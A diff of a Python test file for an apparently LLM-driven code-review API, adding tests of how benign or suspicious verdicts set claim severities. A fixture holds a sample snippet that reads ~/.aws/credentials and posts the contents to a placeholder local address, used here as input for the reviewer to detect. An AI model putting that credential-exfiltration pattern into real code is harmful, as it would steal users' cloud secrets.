@@ -6,6 +6,7 @@ from gpu_worker import reviewer_api as ra
 from gpu_worker import reviewer_bait as bait
 from gpu_worker import reviewer_llm as llm
 from gpu_worker.app import app
+from lineage.schemas.gpu import Claim
 
 client = TestClient(app)
 CODE = 'import os, requests\ndef sync():\n    data = open(os.path.expanduser("~/.aws/credentials")).read()\n    requests.post("http://127.0.0.1:9/u", data=data)\n'
@@ -167,3 +168,27 @@ def test_overlapping_slices_of_one_file_all_count(up, monkeypatch):
     body = client.post("/review/code", json={"purpose": "ROLE: PROSECUTOR. x", "slices": slices}).json()
     assert [c["line"] for c in body["claims"]] == [4]
     assert stub.calls[0][2].count("requests.post") == 1
+
+
+def test_benign_verdict_demotes_all_claims_to_info(up, monkeypatch):
+    install(monkeypatch,
+            prosecutor={"analysis": "", "verdict": "benign", "claims": [claim(3, "open(", "medium"), claim(4, "requests.post", "low")]},
+            defender={"rebuttals": []}, judge={"ratings": [{"claim": 0, "severity": "medium"}], "extra_claims": [], "verdict": "benign"})
+    body = client.post("/review/code", json=REQ).json()
+    assert body["verdict"] == "benign" and len(body["claims"]) == 2          # still reported...
+    assert {c["severity"] for c in body["claims"]} == {"info"}               # ...but add no risk
+
+
+def test_suspicious_verdict_keeps_severities(up, monkeypatch):
+    install(monkeypatch,
+            prosecutor={"analysis": "", "verdict": "suspicious", "claims": [claim(3, "open(", "medium"), claim(4, "requests.post", "low")]},
+            defender={"rebuttals": []}, judge={"ratings": [], "extra_claims": [], "verdict": "suspicious"})
+    body = client.post("/review/code", json=REQ).json()
+    assert body["verdict"] == "suspicious" and {c["line"]: c["severity"] for c in body["claims"]} == {3: "medium", 4: "low"}
+
+
+def test_card_policy_hits_keep_severity_and_raise_verdict(up, monkeypatch):
+    install(monkeypatch, prosecutor={"analysis": "", "verdict": "benign", "claims": []})
+    monkeypatch.setattr(ra, "_policy_claims", lambda *a, **k: [Claim(text="p", file="card.md", line=1, api="# M", severity="medium")])
+    body = client.post("/review/card", json={"card_text": "# M\n", "measured": {}}).json()
+    assert body["verdict"] == "suspicious" and body["claims"][0]["severity"] == "medium"
